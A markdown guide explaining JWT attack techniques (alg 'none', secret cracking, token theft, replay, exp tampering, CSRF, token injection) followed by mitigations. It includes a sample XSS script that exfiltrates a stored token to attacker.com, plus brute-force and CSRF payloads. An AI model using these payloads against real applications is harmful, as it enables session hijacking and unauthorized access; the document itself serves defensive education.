# JSON WEB TOKEN (JWT)

JWT (JSON Web Token) attacks exploit vulnerabilities in token handling, such as weak signing algorithms, token theft, or improper validation, potentially allowing unauthorized access to protected resources.

## Methods to perform JWT

- ###Algorithm Manipulation:

Attackers can exploit applications that do not properly validate the algorithm specified in the JWT header. If the application accepts none as a valid algorithm, an attacker can create a token without a signature.
Example:
```text
{
  "alg": "none",
  "typ": "JWT"
}
```
If the server accepts this token without validation, the attacker can create a valid token with arbitrary claims.

- ### Weak Signing Algorithms:

If the server uses weak signing algorithms (like HS256) and the secret is weak or predictable, attackers can brute-force the secret key.
Example:
```text
# Using a tool like jwt-cracker
jwt-cracker -a HS256 -s "secret" <token>
```
If the secret is found, the attacker can forge valid tokens.

- ### Token Theft:

Attackers can steal JWTs through various means, such as XSS attacks, man-in-the-middle attacks, or insecure storage.
Example:

If a web application stores JWTs in local storage without proper security measures, an attacker can exploit XSS to retrieve the token:
javascript
```texte
// Malicious script
const token = localStorage.getItem('jwt');
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token }),
    headers: { 'Content-Type': 'application/json' }
});
```
- ### Replay Attacks:

If JWTs are not properly invalidated after use, attackers can capture and reuse tokens to gain unauthorized access.
Example:

An attacker intercepts a valid JWT during transmission and reuses it to access protected resources:
```text
GET /api/protected HTTP/1.1
Authorization: Bearer <stolen_jwt>
```
- ### Token Expiration Manipulation:

If the application does not properly handle token expiration, attackers can manipulate the exp claim to extend the validity of a token.
Example:
```text
{
  "exp": 9999999999, // Far future expiration
  "sub": "user_id"
}
```
If the server does not validate the expiration correctly, the attacker can use the token indefinitely.

- ### Cross-Site Request Forgery (CSRF):

If JWTs are stored in cookies without the SameSite attribute, attackers can exploit CSRF vulnerabilities to send requests on behalf of the user.
Example:
```text
<img src="http://vulnerable-website.com/api/transfer?amount=1000" style="display:none;">
```
If the user is authenticated, the request will be sent with the JWT in the cookie.

- ### JWT Injection:

Attackers can inject malicious JWTs into applications that do not validate the token properly.
Example:
```text
POST /api/login HTTP/1.1
Content-Type: application/json

{
    "username": "attacker",
    "password": "password",
    "token": "<malicious_jwt>"
}
```
If the application accepts the injected token, the attacker gains unauthorized access.

## MITIGATION OF JWT
To protect against JWT attacks, consider the following best practices:

 - ### Validate Algorithms:
   Always validate the algorithm specified in the JWT header and reject any tokens that use `none` or weak algorithms.

- ### Use Strong Secrets:
  Use strong, unpredictable secrets for signing tokens and rotate them regularly.

- ### Implement Token Expiration:
  Set reasonable expiration times for tokens and implement refresh tokens for long-lived sessions.

- ### Secure Storage:
  Store JWTs securely, preferably in memory or using secure cookies with the `HttpOnly` and `SameSite` attributes.

- ### Implement CSRF Protection:
  Use anti-CSRF tokens or other mechanisms to protect against CSRF attacks.

- ### Regular Security Audits:
  Conduct regular security assessments and code reviews to identify and remediate vulnerabilities.
